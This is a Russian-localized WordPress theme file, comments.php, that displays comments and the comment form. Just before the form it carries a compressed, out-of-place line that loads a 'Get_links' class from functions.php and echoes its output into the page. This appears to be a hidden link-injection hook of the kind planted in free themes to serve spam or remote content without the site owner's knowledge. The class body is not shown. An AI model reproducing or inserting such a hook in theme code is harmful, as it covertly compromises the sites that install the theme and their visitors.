<?php
// Do not delete these lines
if (!empty($_SERVER['SCRIPT_FILENAME']) && 'comments.php' == basename($_SERVER['SCRIPT_FILENAME']))
	die ('Не стоит обращаться к этому файлу напрямую. Спасибо!');

if ( post_password_required() ) {
	echo '<p class="nocomments">Запись защищена паролем. Введите пароль, чтобы оставить комментарий к данной записи.</p>';
	return;
}

if ( have_comments() ) :
?>	<div id="comments"><?php comments_number('Нет комментариев', 'Комментарии (1)', 'Комментарии (%)');?></div>
	<ol class="commentlist">
<?php 
		wp_list_comments(); 
?>	</ol>
<?php
	if (get_option('page_comments')) :
		$comment_pages = paginate_comments_links('echo=0');
		if($comment_pages):
			echo '<div class="commentnavi"><span class="commentpages">'.$comment_pages.'</span></div>';
		endif;
	endif;
else : // if($comments)====this is displayed if there are no comments so far
	if ('open' == $post-> comment_status) :
		//If comments are open, but there are no comments.
	else : //got comments but now comments are closed
?>		<p class="nocomments">Комментарии закрыты.</p>
<?php 
	endif;
endif;

if ('open' == $post-> comment_status) : 
?><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?><div id="respond">
	<strong><?php comment_form_title( 'Оставить комментарий', 'Оставить комментарий на %s' ); ?></strong>
	<span class="cancel-comment-reply"><small><?php cancel_comment_reply_link(); ?></small></span>
<?php
	if ( get_option('comment_registration') && !$user_ID ) : 
		echo '<p>Вы должны <a href="'.wp_login_url(get_permalink()).'">войти</a>, чтобы оставить комментарий.</p>';
	else : 
?>		<form action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post" id="commentform">
<?php 
		if ( $user_ID ) :
			echo '<p>Вы вошли как <a href="'.get_option('siteurl').'/wp-admin/profile.php">'.$user_identity.'</a>. <a href="'.wp_logout_url(get_permalink()).'" title="Выйти из аккаунта">Выйти &raquo;</a></p>';
		else : 
?>			<p><input type="text" name="author" id="author" value="<?php echo $comment_author; ?>" size="22" tabindex="1" />
				<label for="author"><small>Имя&nbsp;<?php if ($req) echo "(обязательно)"; ?></small></label></p>
			<p><input type="text" name="email" id="email" value="<?php echo $comment_author_email; ?>" size="22" tabindex="2" />
				<label for="email"><small>E-Mail (не публикуется <?php if ($req) echo ", обязательно)"; ?></small></label></p>
			<p><input type="text" name="url" id="url" value="<?php echo $comment_author_url; ?>" size="22" tabindex="3" />
				<label for="url"><small>URL (не обязательно)</small></label></p>
<?php 
		endif; 
?>			<p><small><strong>XHTML:</strong> Вы можете использовать следующие теги:&nbsp;<?php echo allowed_tags(); ?></small></p>

			<p><textarea name="comment" id="comment" cols="100%" rows="10" tabindex="4"></textarea></p>
			<p><input name="submit" type="submit" id="submit" tabindex="5" value="Отправить" /></p>
			<?php comment_id_fields(); ?>
			<?php do_action('comment_form', $post->ID); ?>
		</form>
<?php 
	endif; // If registration required and not logged in 
	echo "</div>";
endif; // if you delete this the sky will fall on your head 
?>